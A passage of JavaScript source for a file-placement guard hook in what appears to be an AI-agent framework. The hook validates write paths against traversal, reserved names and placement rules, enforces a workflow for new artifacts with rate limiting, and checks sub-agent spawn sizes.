function isWindowsReservedName(filePath) {
  if (!filePath || typeof filePath !== 'string') {
    return { reserved: false };
  }

  // Get the basename (filename only, no directory)
  const basename = path.basename(filePath);

  if (!basename) {
    return { reserved: false };
  }

  // Extract name without extension (Windows reserves names regardless of extension)
  // e.g., "NUL.txt" -> "NUL", "CON" -> "CON", "nul.test.md" -> "nul"
  const nameWithoutExt = basename.split('.')[0].toUpperCase();

  if (WINDOWS_RESERVED_NAMES.includes(nameWithoutExt)) {
    return {
      reserved: true,
      name: nameWithoutExt,
      reason: `"${basename}" uses Windows reserved device name "${nameWithoutExt}". These names cannot be used as files on Windows.`,
    };
  }

  return { reserved: false };
}

function isPathSafe(filePath, projectRoot) {
  // Fail-closed: Reject null/undefined/empty paths
  if (!filePath || typeof filePath !== 'string') {
    return { safe: false, reason: 'Invalid path: null, undefined, or empty' };
  }

  if (!projectRoot || typeof projectRoot !== 'string') {
    return { safe: false, reason: 'Invalid projectRoot: null, undefined, or empty' };
  }

  // Normalize both paths for comparison
  const normalizedFilePath = filePath.replace(/\\/g, '/');
  const _normalizedRoot = projectRoot.replace(/\\/g, '/');

  // Check for path traversal patterns BEFORE resolution
  for (const pattern of PATH_TRAVERSAL_PATTERNS) {
    if (pattern.test(normalizedFilePath)) {
      return { safe: false, reason: 'Path contains traversal sequence or invalid characters' };
    }
  }

  // Resolve to absolute path
  let resolvedPath;
  try {
    resolvedPath = path.resolve(projectRoot, filePath);
  } catch (_e) {
    return { safe: false, reason: 'Failed to resolve path' };
  }

  // Normalize the resolved path and project root for consistent comparison
  const normalizedResolved = path.normalize(resolvedPath).replace(/\\/g, '/');
  const normalizedProjectRoot = path.normalize(projectRoot).replace(/\\/g, '/');

  // Ensure the resolved path starts with the project root
  // Add trailing slash to prevent partial matches (e.g., /foo matching /foobar)
  const rootWithSlash = normalizedProjectRoot.endsWith('/')
    ? normalizedProjectRoot
    : normalizedProjectRoot + '/';

  const resolvedWithSlash = normalizedResolved.endsWith('/')
    ? normalizedResolved
    : normalizedResolved + '/';

  // Check if resolved path is within project root (or is the project root itself)
  if (
    !resolvedWithSlash.startsWith(rootWithSlash) &&
    normalizedResolved !== normalizedProjectRoot
  ) {
    return { safe: false, reason: 'Path escapes PROJECT_ROOT' };
  }

  return { safe: true };
}

function getEvolutionState(projectRoot) {
  const root = projectRoot || findProjectRoot();
  const defaultState = {
    state: 'idle',
    currentEvolution: null,
    spawnDepth: 0,
    circuitBreaker: { timestamps: [] },
    evolutions: [], // Legacy backwards compatibility
  };

  if (!root) {
    return defaultState;
  }

  const statePath = path.join(root, '.claude', 'context', 'evolution-state.json');
  try {
    // PERF-004 FIX: Use cached state with 1s TTL (default)
    // This reduces redundant file reads across hooks in the same tool operation
    // Pass null as default so we can detect when cache returns nothing
    const cached = getCachedState(statePath, null);
    if (cached !== null && typeof cached === 'object') {
      // PERF-004: Cache hit - extract only known properties to prevent prototype pollution
      // This is equivalent to safeParseJSON but without re-serialization overhead
      const result = { ...defaultState };

      // Only copy known properties (SEC-SF-001 safe extraction)
      if (typeof cached.state === 'string') {
        result.state = cached.state;
      }
      if (cached.currentEvolution && typeof cached.currentEvolution === 'object') {
        result.currentEvolution = cached.currentEvolution;
      }
      if (typeof cached.spawnDepth === 'number') {
        result.spawnDepth = cached.spawnDepth;
      }
      if (cached.circuitBreaker && typeof cached.circuitBreaker === 'object') {
        result.circuitBreaker = {
          timestamps: Array.isArray(cached.circuitBreaker.timestamps)
            ? cached.circuitBreaker.timestamps
            : [],
        };
      }
      // Legacy evolutions array for backwards compatibility with checkCircuitBreaker
      if (Array.isArray(cached.evolutions)) {
        result.evolutions = cached.evolutions.filter(
          e => e && typeof e === 'object' && typeof e.completedAt === 'string'
        );
      }

      return result;
    }
  } catch (e) {
    // Ignore errors, default to idle - fail closed
    if (process.env.PLACEMENT_DEBUG === 'true') {
      console.log(`[file-placement-guard] Error reading evolution state: ${e.message}`);
    }
  }
  return defaultState;
}

function isInArtifactDirectory(filePath, projectRoot) {
  const normalizedPath = filePath.replace(/\\/g, '/');
  const root = projectRoot.replace(/\\/g, '/');

  // Get relative path from project root
  let relativePath;
  if (normalizedPath.startsWith(root)) {
    relativePath = normalizedPath.substring(root.length);
    if (relativePath.startsWith('/')) {
      relativePath = relativePath.substring(1);
    }
  } else {
    // Try to extract .claude path
    const claudeIndex = normalizedPath.indexOf('.claude/');
    if (claudeIndex !== -1) {
      relativePath = normalizedPath.substring(claudeIndex);
    } else {
      return false;
    }
  }

  return ARTIFACT_DIRECTORIES.some(dir => relativePath.startsWith(dir));
}

function isNewArtifactCreation(filePath, projectRoot) {
  // Check if it's in an artifact directory
  if (!isInArtifactDirectory(filePath, projectRoot)) {
    return false;
  }

  // Normalize path for checking
  const normalizedPath = path.normalize(filePath);

  // Check if file already exists (edit vs create)
  return !fs.existsSync(normalizedPath);
}

function isTestFile(filePath) {
  const normalized = filePath.toLowerCase();
  return normalized.includes('.test.') || normalized.includes('.spec.');
}

function checkEvolveEnforcement(filePath, projectRoot) {
  // Check for override
  if (process.env.EVOLVE_ENFORCEMENT_OVERRIDE === 'true') {
    return { blocked: false };
  }

  const root = projectRoot || findProjectRoot(filePath);
  if (!root) {
    // Can't determine project root, allow
    return { blocked: false };
  }

  // Test files are always exempt
  if (isTestFile(filePath)) {
    return { blocked: false };
  }

  // Check if this is a new artifact creation
  if (!isNewArtifactCreation(filePath, root)) {
    // Not a new artifact, allow
    return { blocked: false };
  }

  // Check evolution state
  const evolutionState = getEvolutionState(root);

  // If state allows creation, permit
  if (CREATION_ALLOWED_STATES.includes(evolutionState.state)) {
    return { blocked: false };
  }

  // State is idle or other non-creation state - block
  const fileName = path.basename(filePath);
  return {
    blocked: true,
    reason: `EVOLVE REQUIRED: Cannot create new artifact "${fileName}" without EVOLVE workflow. Current state: ${evolutionState.state}. Spawn evolution-orchestrator first.`,
    suggestion:
      'Use: Task({ subagent_type: "evolution-orchestrator", prompt: "Create new artifact..." })',
  };
}

function getEnforcementMode() {
  const mode = process.env.FILE_PLACEMENT_GUARD || 'block';
  return ['block', 'warn', 'off'].includes(mode) ? mode : 'block';
}

function validateHookInput(content) {
  if (!content || typeof content !== 'string') {
    return null;
  }

  try {
    const parsed = JSON.parse(content);

    // Must be an object
    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
      return null;
    }

    // Create validated object with only known properties
    const validated = Object.create(null);
    const dangerousKeys = ['__proto__', 'constructor', 'prototype'];

    for (const key of Object.keys(HOOK_INPUT_SCHEMA.defaults)) {
      if (Object.prototype.hasOwnProperty.call(parsed, key) && !dangerousKeys.includes(key)) {
        const value = parsed[key];
        // Deep copy nested objects to prevent reference manipulation
        if (value !== null && typeof value === 'object') {
          try {
            validated[key] = JSON.parse(JSON.stringify(value));
          } catch (_e) {
            validated[key] = null;
          }
        } else {
          validated[key] = value;
        }
      }
    }

    return Object.assign({}, validated);
  } catch (_e) {
    // JSON parse failed
    return null;
  }
}

function _getFilePath(toolInput) {
  if (!toolInput) return null;

  // Try common parameter names
  if (toolInput.file_path) return toolInput.file_path;
  if (toolInput.filePath) return toolInput.filePath;
  if (toolInput.path) return toolInput.path;
  if (toolInput.notebook_path) return toolInput.notebook_path;

  return null;
}

function isClaudePath(filePath) {
  const normalizedPath = filePath.replace(/\\/g, '/');
  return normalizedPath.includes('.claude/') || normalizedPath.includes('.claude\\');
}

function getRelativePath(filePath) {
  const normalizedPath = filePath.replace(/\\/g, '/');
  const claudeIndex = normalizedPath.indexOf('.claude/');
  if (claudeIndex === -1) {
    const claudeIndexWin = normalizedPath.indexOf('.claude\\');
    if (claudeIndexWin === -1) return null;
    return normalizedPath.substring(claudeIndexWin);
  }
  return normalizedPath.substring(claudeIndex);
}

function isAlwaysAllowed(filePath) {
  if (!filePath) return false;
  const normalizedPath = path.normalize(filePath);
  return ALWAYS_ALLOWED_PATTERNS.some(pattern => pattern.test(normalizedPath));
}

function isValidPath(filePath) {
  // Normalize path for consistent checking
  const normalizedPath = filePath.replace(/\\/g, '/');

  // If not a .claude path, allow it (outside framework scope)
  if (!isClaudePath(normalizedPath)) {
    return { valid: true, reason: 'Outside .claude directory' };
  }

  // Extract relative path from .claude
  const relativePath = getRelativePath(normalizedPath);
  if (!relativePath) {
    return { valid: true, reason: 'Could not determine relative path' };
  }

  // Check forbidden paths first (always blocked)
  for (const pattern of FORBIDDEN_PATHS) {
    if (pattern.test(relativePath)) {
      return {
        valid: false,
        reason: `Forbidden path - framework internal: ${relativePath.substring(8, 30)}...`,
      };
    }
  }

  // ADR-076: Block test files in .claude/ - all tests must go in root tests/ directory
  // This check comes before valid patterns to ensure no test files are ever allowed in .claude/
  const fileName = path.basename(relativePath);
  for (const pattern of TEST_FILE_PATTERNS) {
    if (pattern.test(fileName)) {
      return {
        valid: false,
        reason: `Test files are forbidden in .claude/ - use tests/ directory instead`,
      };
    }
  }

  // Check if matches any valid pattern
  for (const [category, pattern] of Object.entries(VALID_PATHS)) {
    if (pattern.test(relativePath)) {
      return { valid: true, category, reason: `Matches ${category} pattern` };
    }
  }

  // Special case: root level files that aren't in our allow list
  const rootLevelMatch = /^\.claude[/\\]([^/\\]+)$/.exec(relativePath);
  if (rootLevelMatch) {
    const fileName = rootLevelMatch[1];
    return {
      valid: false,
      reason: `Invalid root-level file: ${fileName} (only CLAUDE.md, config.yaml, settings.json allowed)`,
    };
  }

  // Check for direct writes to context/ without proper subdirectory
  if (/^\.claude[/\\]context[/\\][^/\\]+$/.test(relativePath)) {
    return {
      valid: false,
      reason: 'Files must be in context subdirectories (artifacts/, memory/, config/, etc.)',
    };
  }

  // Check for direct writes to artifacts/ without category subdirectory
  if (/^\.claude[/\\]context[/\\]artifacts[/\\][^/\\]+$/.test(relativePath)) {
    const match = /^\.claude[/\\]context[/\\]artifacts[/\\]([^/\\]+)$/.exec(relativePath);
    const fileName = match ? match[1] : 'file';
    // Allow .gitkeep
    if (fileName === '.gitkeep') {
      return { valid: true, reason: 'Gitkeep allowed' };
    }
    return {
      valid: false,
      reason: `Files must be in artifacts subdirectories (plans/, reports/, research-reports/, diagrams/), not directly in artifacts/`,
    };
  }

  // No matching rule found
  return {
    valid: false,
    reason: `No matching placement rule for: ${relativePath.substring(0, 50)}...`,
  };
}

function formatWarningMessage(toolName, filePath, result) {
  const fileName = filePath ? path.basename(filePath) : 'unknown';
  const reasonText = result.reason.substring(0, 48);

  const lines = [
    '',
    '┌──────────────────────────────────────────────────────────────────┐',
    '│  ⚠️  FILE PLACEMENT WARNING                                       │',
    '├──────────────────────────────────────────────────────────────────┤',
    `│  Tool: ${toolName.padEnd(56)}   │`,
    `│  File: ${fileName.slice(0, 56).padEnd(56)}   │`,
    `│  Reason: ${reasonText.padEnd(54)}   │`,
    '├──────────────────────────────────────────────────────────────────┤',
    '│  This file may be in the wrong location.                        │',
    '│  See: .claude/docs/FILE_PLACEMENT_RULES.md                      │',
    '│                                                                  │',
    '│  Set FILE_PLACEMENT_GUARD=block to enforce.                     │',
    '└──────────────────────────────────────────────────────────────────┘',
    '',
  ];
  return lines.join('\n');
}

function formatEvolveBlockedMessage(toolName, filePath, evolveResult) {
  const fileName = filePath ? path.basename(filePath) : 'unknown';
  const reasonText = (evolveResult.reason || 'EVOLVE required').substring(0, 54);

  const lines = [
    '',
    '+=======================================================================+',
    '|  EVOLVE WORKFLOW REQUIRED                                             |',
    '+-----------------------------------------------------------------------+',
    `|  Tool: ${toolName.padEnd(60)}   |`,
    `|  File: ${fileName.slice(0, 60).padEnd(60)}   |`,
    `|  Reason: ${reasonText.padEnd(58)}   |`,
    '+-----------------------------------------------------------------------+',
    '|  New artifacts require the EVOLVE workflow.                           |',
    '|  Spawn evolution-orchestrator first to create this artifact.          |',
    '+-----------------------------------------------------------------------+',
    '|  Task({ subagent_type: "evolution-orchestrator",                      |',
    '|         prompt: "Create new artifact: <name>" })                      |',
    '+=======================================================================+',
    '',
  ];
  return lines.join('\n');
}

function formatEvolveWarningMessage(toolName, filePath, _evolveResult) {
  const fileName = filePath ? path.basename(filePath) : 'unknown';

  const lines = [
    '',
    '+-----------------------------------------------------------------------+',
    '|  EVOLVE WORKFLOW RECOMMENDED                                          |',
    '+-----------------------------------------------------------------------+',
    `|  Tool: ${toolName.padEnd(60)}   |`,
    `|  File: ${fileName.slice(0, 60).padEnd(60)}   |`,
    '+-----------------------------------------------------------------------+',
    '|  New artifacts should use the EVOLVE workflow.                        |',
    '|  Consider spawning evolution-orchestrator instead.                    |',
    '+-----------------------------------------------------------------------+',
    '',
  ];
  return lines.join('\n');
}

function main() {
  const enforcementMode = getEnforcementMode();

  // Skip if enforcement is off
  if (enforcementMode === 'off') {
    // SEC-AUDIT-016 FIX: Use centralized auditSecurityOverride for consistent logging
    auditSecurityOverride(
      'file-placement-guard',
      'FILE_PLACEMENT_GUARD',
      'off',
      'File placement validation bypassed'
    );
    process.exit(0);
  }

  // Check for override
  if (process.env.FILE_PLACEMENT_OVERRIDE === 'true') {
    // SEC-AUDIT-016 FIX: Use centralized auditSecurityOverride for consistent logging
    auditSecurityOverride(
      'file-placement-guard',
      'FILE_PLACEMENT_OVERRIDE',
      'true',
      'File placement validation bypassed'
    );
    if (process.env.PLACEMENT_DEBUG === 'true') {
      console.log('[file-placement-guard] Override enabled, skipping checks');
    }
    process.exit(0);
  }

  // PERF-006/PERF-007: Use shared hook-input.cjs utility
  // SEC-AUDIT-010: validateHookInput provides schema validation
  const hookInput = validateHookInput(process.argv[2]);
  if (!hookInput) {
    process.exit(0);
  }

  // Get tool name and input using shared helpers
  const toolName = sharedGetToolName(hookInput);
  const toolInput = sharedGetToolInput(hookInput);

  // Only check write tools
  if (!WRITE_TOOLS.includes(toolName)) {
    process.exit(0);
  }

  // Get file path using shared helper
  const filePath = sharedExtractFilePath(toolInput);

  if (!filePath) {
    process.exit(0);
  }

  // SEC-PT-001: Path traversal validation (CRITICAL - check early)
  const projectRoot = findProjectRoot(filePath);
  if (projectRoot) {
    const pathSafetyCheck = isPathSafe(filePath, projectRoot);
    if (!pathSafetyCheck.safe) {
      // Audit log the blocked path traversal attempt
      console.error(
        JSON.stringify({
          hook: 'file-placement-guard',
          event: 'path_traversal_blocked',
          tool: toolName,
          path: filePath.substring(0, 100),
          reason: pathSafetyCheck.reason,
          timestamp: new Date().toISOString(),
          severity: 'CRITICAL',
        })
      );
      // Output human-readable blocked message
      console.error(`\n[BLOCKED] Path traversal detected: ${pathSafetyCheck.reason}\n`);
      try {
        eventBus.emit(EventTypes.TOOL_BLOCKED, {
          type: EventTypes.TOOL_BLOCKED,
          timestamp: new Date().toISOString(),
          toolName,
          reason: 'path_traversal_blocked',
        });
      } catch (_err) {
        // Best-effort
      }
      process.exit(2);
    }
  }

  // Memory JSON enforcement: prevent direct Write/Edit to structured memory files.
  if (MEMORY_JSON_WRITE_ENFORCEMENT !== 'off') {
    const normalizedPath = filePath.replace(/\\/g, '/');
    const baseName = path.basename(filePath);
    const isMemoryJson =
      (normalizedPath.includes('/.claude/context/memory/') ||
        normalizedPath.includes('.claude/context/memory/')) &&
      MEMORY_JSON_FILES.has(baseName);

    if (isMemoryJson) {
      const warning = `Direct edits to ${baseName} are blocked. Use MemoryRecord instead.`;
      console.error(
        JSON.stringify({
          hook: 'file-placement-guard',
          event: 'memory_json_write_blocked',
          tool: toolName,
          path: filePath.substring(0, 120),
          reason: warning,
          timestamp: new Date().toISOString(),
          severity: 'HIGH',
        })
      );
      console.error(`\n[BLOCKED] ${warning}\n`);

      try {
        eventBus.emit(EventTypes.TOOL_BLOCKED, {
          type: EventTypes.TOOL_BLOCKED,
          timestamp: new Date().toISOString(),
          toolName,
          reason: 'memory_json_write_blocked',
        });
      } catch (_err) {
        // Best-effort
      }

      if (MEMORY_JSON_WRITE_ENFORCEMENT === 'warn' || enforcementMode === 'warn') {
        process.exit(0);
      }
      process.exit(2);
    }
  }

  // SEC-WIN-001: Windows reserved device name validation (CRITICAL - check early)
  // This prevents creating files like "nul", "con", "prn" which cause issues on Windows
  // Even on non-Windows platforms, block these to maintain cross-platform compatibility
  const reservedNameCheck = isWindowsReservedName(filePath);
  if (reservedNameCheck.reserved) {
    // Audit log the blocked reserved name attempt
    console.error(
      JSON.stringify({
        hook: 'file-placement-guard',
        event: 'windows_reserved_name_blocked',
        tool: toolName,
        path: filePath.substring(0, 100),
        reservedName: reservedNameCheck.name,
        reason: reservedNameCheck.reason,
        timestamp: new Date().toISOString(),
        severity: 'HIGH',
      })
    );
    // Output human-readable blocked message
    console.error(`
+======================================================================+
|  BLOCKED: Windows Reserved Device Name Detected                      |
+======================================================================+
|  Tool: ${toolName.padEnd(60)}|
|  File: ${path.basename(filePath).slice(0, 60).padEnd(60)}|
|  Reserved Name: ${(reservedNameCheck.name || 'UNKNOWN').padEnd(52)}|
+----------------------------------------------------------------------+
|  Windows reserved device names (CON, PRN, AUX, NUL, COM1-9, LPT1-9)  |
|  cannot be used as file names. They have special OS-level meaning.   |
|                                                                      |
|  Creating files with these names causes:                             |
|  - Denial of service (can't delete/access properly)                  |
|  - Unexpected device interactions                                    |
|  - Cross-platform compatibility issues                               |
+======================================================================+
`);
    try {
      eventBus.emit(EventTypes.TOOL_BLOCKED, {
        type: EventTypes.TOOL_BLOCKED,
        timestamp: new Date().toISOString(),
        toolName,
        reason: 'windows_reserved_name_blocked',
      });
    } catch (_err) {
      // Best-effort
    }
    process.exit(2);
  }

  // Check if file is always allowed (framework internal)
  if (isAlwaysAllowed(filePath)) {
    if (process.env.PLACEMENT_DEBUG === 'true') {
      console.log(`[file-placement-guard] Always allowed: ${filePath}`);
    }
    process.exit(0);
  }

  // EVOLVE enforcement: Block new artifact creation when not in evolution workflow
  const evolveCheck = checkEvolveEnforcement(filePath);
  if (evolveCheck.blocked) {
    // Build structured trigger data for auto-start capability
    const triggerData = buildEvolveTriggerData(filePath);

    if (enforcementMode === 'block') {
      // Output human-readable message
      console.error(formatEvolveBlockedMessage(toolName, filePath, evolveCheck));

      // Output structured JSON for Router consumption
      // This allows the Router to auto-spawn evolution-orchestrator if EVOLVE_AUTO_START=true
      if (triggerData) {
        console.error('');
        console.error('=== EVOLVE TRIGGER DATA (JSON) ===');
        console.error(JSON.stringify(triggerData, null, 2));

        // If auto-start is enabled and circuit breaker allows, output spawn instructions
        if (triggerData.spawnInstructions) {
          console.error('');
          console.error('=== AUTO-SPAWN INSTRUCTIONS ===');
          console.error(triggerData.spawnInstructions);
        }
      }

      try {
        eventBus.emit(EventTypes.TOOL_BLOCKED, {
          type: EventTypes.TOOL_BLOCKED,
          timestamp: new Date().toISOString(),
          toolName,
          reason: 'evolve_enforcement_blocked',
        });
      } catch (_err) {
        // Best-effort
      }
      process.exit(2);
    } else {
      console.warn(formatEvolveWarningMessage(toolName, filePath, evolveCheck));
      // Continue to normal path validation in warn mode
    }
  }

  // Validate path against placement rules
  const result = isValidPath(filePath);

  if (result.valid) {
    if (process.env.PLACEMENT_DEBUG === 'true') {
      console.log(`[file-placement-guard] Valid: ${result.reason} (${result.category || 'n/a'})`);
    }
    process.exit(0);
  }

  // Path is invalid - show message based on enforcement mode
  if (enforcementMode === 'block') {
    console.error(formatBlockedMessage(toolName, filePath, result));
    try {
      eventBus.emit(EventTypes.TOOL_BLOCKED, {
        type: EventTypes.TOOL_BLOCKED,
        timestamp: new Date().toISOString(),
        toolName,
        reason: 'invalid_file_placement',
      });
    } catch (_err) {
      // Best-effort
    }
    process.exit(2);
  } else {
    // warn mode (default during rollout)
    console.warn(formatWarningMessage(toolName, filePath, result));
    process.exit(0);
  }
}

function getRateLimit() {
  const envLimit = process.env.EVOLVE_RATE_LIMIT;
  if (envLimit) {
    const parsed = parseInt(envLimit, 10);
    if (!isNaN(parsed) && parsed > 0) {
      return parsed;
    }
  }
  return DEFAULT_RATE_LIMIT;
}

function isAutoStartEnabled() {
  // Opt-out mode: default true unless explicitly set to 'false'
  return process.env.EVOLVE_AUTO_START !== 'false';
}

function detectArtifactType(filePath) {
  const normalized = filePath.replace(/\\/g, '/');

  if (normalized.includes('.claude/agents/')) return 'agent';
  if (normalized.includes('.claude/skills/')) return 'skill';
  if (normalized.includes('.claude/hooks/')) return 'hook';
  if (normalized.includes('.claude/workflows/')) return 'workflow';
  if (normalized.includes('.claude/templates/')) return 'template';
  if (normalized.includes('.claude/schemas/')) return 'schema';

  return 'unknown';
}

function extractArtifactName(filePath, artifactType) {
  const normalized = filePath.replace(/\\/g, '/');
  const parts = normalized.split('/');

  switch (artifactType) {
    case 'agent': {
      // agents/core/name.md -> name
      const fileName = parts[parts.length - 1];
      return fileName.replace(/\.md$/, '');
    }
    case 'skill': {
      // skills/name/SKILL.md -> name
      const skillIndex = parts.findIndex(p => p === 'skills');
      if (skillIndex !== -1 && parts.length > skillIndex + 1) {
        return parts[skillIndex + 1];
      }
      break;
    }
    case 'hook': {
      // hooks/category/name.cjs -> name
      const fileName = parts[parts.length - 1];
      return fileName.replace(/\.(cjs|js)$/, '');
    }
    case 'workflow': {
      // workflows/category/name.md -> name
      const fileName = parts[parts.length - 1];
      return fileName.replace(/\.(md|yaml)$/, '');
    }
    case 'template': {
      // templates/name.md -> name
      const fileName = parts[parts.length - 1];
      return fileName.replace(/\.(md|yaml|json)$/, '');
    }
    case 'schema': {
      // schemas/name.schema.json -> name
      const fileName = parts[parts.length - 1];
      return fileName.replace(/\.schema\.json$/, '');
    }
  }

  // Fallback: use file name without extension
  const fileName = parts[parts.length - 1];
  return fileName.replace(/\.[^.]+$/, '');
}

function getArtifactDirectory(filePath) {
  const normalized = filePath.replace(/\\/g, '/');
  const claudeIndex = normalized.indexOf('.claude/');
  if (claudeIndex === -1) return '';

  const relativePath = normalized.substring(claudeIndex);
  const parts = relativePath.split('/');

  // Return up to and including the artifact type directory
  // e.g., .claude/agents/core/ or .claude/skills/
  if (parts.length >= 2) {
    return parts.slice(0, 3).join('/') + '/';
  }
  return parts.join('/');
}

function checkCircuitBreaker(projectRoot) {
  const rateLimit = getRateLimit();
  const evolutionState = getEvolutionState(projectRoot);

  const now = Date.now();
  const windowStart = now - RATE_LIMIT_WINDOW_MS;

  // SEC-AS-001 FIX: Use circuitBreaker.timestamps array instead of counting evolutions
  // This is more tamper-resistant as each timestamp must be a valid ISO date within the window
  const timestamps = evolutionState.circuitBreaker?.timestamps || [];

  // SEC-AS-002 FIX: Filter to only timestamps within the last hour (prune on read)
  // This prevents clock manipulation bypasses
  const recentTimestamps = timestamps.filter(ts => {
    if (!ts) return false;
    const tsTime = new Date(ts).getTime();
    // Invalid dates return NaN, which will fail this check
    return !isNaN(tsTime) && tsTime > windowStart;
  });

  // Also check legacy evolutions array for backwards compatibility
  const evolutions = evolutionState.evolutions || [];
  const recentEvolutions = evolutions.filter(e => {
    if (!e.completedAt) return false;
    const completedTime = new Date(e.completedAt).getTime();
    return !isNaN(completedTime) && completedTime > windowStart;
  });

  // Use the higher of the two counts (timestamps takes precedence if both exist)
  const recentCount = Math.max(recentTimestamps.length, recentEvolutions.length);
  const remaining = Math.max(0, rateLimit - recentCount);
  const allowed = recentCount < rateLimit;

  return {
    allowed,
    remaining,
    recentCount,
  };
}

function checkSpawnDepth(projectRoot) {
  const evolutionState = getEvolutionState(projectRoot);
  const depth = evolutionState.spawnDepth || 0;

  return {
    allowed: depth === 0,
    depth,
  };
}

function sanitizePathForPrompt(filePath) {
  if (!filePath || typeof filePath !== 'string') return '';

  let safe = filePath;

  // Remove all dangerous characters
  for (const char of DANGEROUS_PATH_CHARS) {
    safe = safe.split(char).join('');
  }

  // Truncate to prevent prompt overflow (500 chars max)
  if (safe.length > 500) {
    safe = safe.substring(0, 500);
  }

  return safe;
}

function isSensitivePath(filePath) {
  if (!filePath || typeof filePath !== 'string') return true; // Fail-closed
  const normalizedPath = filePath.replace(/\\/g, '/');
  return SENSITIVE_PATH_PATTERNS.some(pattern => pattern.test(normalizedPath));
}

function buildEvolveTriggerData(filePath, projectRoot) {
  const root = projectRoot || findProjectRoot(filePath);

  // Check if this would be blocked
  const evolveCheck = checkEvolveEnforcement(filePath, root);
  if (!evolveCheck.blocked) {
    return null;
  }

  const evolutionState = getEvolutionState(root);
  const circuitBreaker = checkCircuitBreaker(root);
  const spawnDepthCheck = checkSpawnDepth(root);
  const artifactType = detectArtifactType(filePath);
  const artifactName = extractArtifactName(filePath, artifactType);

  // Get relative path
  let relativePath = filePath;
  if (root) {
    const normalizedFile = filePath.replace(/\\/g, '/');
    const normalizedRoot = root.replace(/\\/g, '/');
    if (normalizedFile.startsWith(normalizedRoot)) {
      relativePath = normalizedFile.substring(normalizedRoot.length);
      if (relativePath.startsWith('/')) {
        relativePath = relativePath.substring(1);
      }
    } else {
      // Try to extract from .claude path
      const claudeIndex = normalizedFile.indexOf('.claude/');
      if (claudeIndex !== -1) {
        relativePath = normalizedFile.substring(claudeIndex);
      }
    }
  }

  // SEC-IV-002 FIX: Check if path is sensitive (never auto-spawn for sensitive paths)
  const pathIsSensitive = isSensitivePath(relativePath);

  // SEC-AS-004 FIX: Check spawn depth (prevent recursive spawn loops)
  // SEC-IV-002 FIX: Block auto-spawn for sensitive paths
  // Determine if auto-start should be enabled
  // Only enable if:
  // 1. Env var is set AND
  // 2. Circuit breaker allows AND
  // 3. Spawn depth is 0 AND
  // 4. Path is not sensitive
  const autoStartEnabled =
    isAutoStartEnabled() && circuitBreaker.allowed && spawnDepthCheck.allowed && !pathIsSensitive;

  const triggerData = {
    blocked: true,
    reason: evolveCheck.reason,
    artifact: {
      type: artifactType,
      path: sanitizePathForPrompt(relativePath), // SEC-IV-001 FIX: Sanitize path
      directory: getArtifactDirectory(filePath),
      name: artifactName,
    },
    evolve: {
      autoStart: autoStartEnabled,
      currentState: evolutionState.state || 'idle',
      circuitBreaker,
      spawnDepth: spawnDepthCheck.depth, // SEC-AS-004: Include spawn depth
    },
  };

  // Add spawn instructions if auto-start is enabled
  const spawnInstructions = generateSpawnInstructions(triggerData);
  if (spawnInstructions) {
    triggerData.spawnInstructions = spawnInstructions;
  }

  return triggerData;
}

function generateSpawnInstructions(triggerData) {
  if (!triggerData) return null;
  if (!triggerData.evolve.autoStart) return null;
  if (!triggerData.evolve.circuitBreaker.allowed) return null;

  const { artifact } = triggerData;

  return `Task({
  subagent_type: 'evolution-orchestrator',
  description: 'Creating new ${artifact.type}: ${artifact.name}',
  allowed_tools: ['Read', 'Write', 'Edit', 'Task', 'Skill', 'TaskUpdate', 'TaskList', 'mcp__Exa__*'],
  prompt: \`You are EVOLUTION-ORCHESTRATOR. Follow the EVOLVE workflow to create a new ${artifact.type}.

Requested artifact: ${artifact.name}
Target path: ${artifact.path}

Read: .claude/agents/orchestrators/evolution-orchestrator.md
Follow: .claude/workflows/core/evolution-workflow.md

CRITICAL: Phase O (Obtain/Research) is MANDATORY. You cannot create the artifact without completing research first.\`
})`;
}

function calculateSpawnSize(toolsArray, promptString, templateString) {
  const toolCount = toolsArray.length;
  const toolBytes = toolCount * BYTES_PER_TOOL;
  const promptBytes = promptString.length;
  const templateBytes = templateString.length;

  const totalBytes = BASE_OVERHEAD + toolBytes + promptBytes + templateBytes;
  const totalKB = Math.round((totalBytes / 1024) * 10) / 10;

  return {
    totalBytes,
    totalKB,
    toolCount,
    breakdown: {
      base: BASE_OVERHEAD,
      tools: toolBytes,
      prompt: promptBytes,
      template: templateBytes,
    },
  };
}

function validateSpawnSize(sizeKB, toolCount, mode) {
  if (mode === 'off') {
    return { status: 'pass', message: '' };
  }

  // Check block thresholds
  if (sizeKB >= BLOCK_SIZE_KB || toolCount >= BLOCK_TOOL_COUNT) {
    if (mode === 'block') {
      const message = `⚠️  SPAWN SIZE BLOCKED: ${sizeKB} KB (${toolCount} tools)
Reason: Exceeds block threshold (${BLOCK_SIZE_KB} KB, ${BLOCK_TOOL_COUNT} tools)

Set SPAWN_SIZE_VALIDATOR=warn to allow with warning.`;
      return { status: 'block', message };
    } else {
      const message = `⚠️  SPAWN SIZE WARNING: ${sizeKB} KB (${toolCount} tools)
Reason: Exceeds block threshold (${BLOCK_SIZE_KB} KB, ${BLOCK_TOOL_COUNT} tools)`;
      return { status: 'warn', message };
    }
  }

  // Check warn thresholds
  if (sizeKB >= WARN_SIZE_KB || toolCount >= WARN_TOOL_COUNT) {
    const message = `⚠️  SPAWN SIZE WARNING: ${sizeKB} KB (${toolCount} tools)
Reason: Exceeds recommended size threshold (${WARN_SIZE_KB} KB, ${WARN_TOOL_COUNT} tools)`;
    return { status: 'warn', message };
  }

  return { status: 'pass', message: '' };
}

function generatePruningSuggestions(toolsArray) {
  const suggestions = [];
  let totalSavingsBytes = 0;

  // Priority 1: Remove chrome tools (16 tools ~3200 bytes)
  const chromeTools = toolsArray.filter(
    t => t.startsWith('mcp__chrome-devtools__') || t.startsWith('mcp__claude-in-chrome__')
  );
  if (chromeTools.length > 0) {
    const savingsBytes = chromeTools.length * BYTES_PER_TOOL;
    totalSavingsBytes += savingsBytes;
    suggestions.push(
      `1. Remove chrome tools (${chromeTools.length} tools: mcp__chrome-devtools__*, mcp__claude-in-chrome__*) → Save ~${Math.round((savingsBytes / 1024) * 10) / 10} KB`
    );
  }

  // Priority 2: Remove optional MCP tools (keep core tools only)
  const coreTools = new Set([
    'Read',
    'Write',
    'Edit',
    'Bash',
    'Glob',
    'Grep',
    'Task',
    'TaskUpdate',
    'TaskList',
    'TaskCreate',
    'TaskGet',
    'TaskOutput',
    'Skill',
  ]);
  const optionalTools = toolsArray.filter(
    t =>
      !coreTools.has(t) &&
      !chromeTools.includes(t) &&
      (t.startsWith('mcp__') || ['WebSearch', 'WebFetch', 'NotebookEdit'].includes(t))
  );

  if (optionalTools.length > 0) {
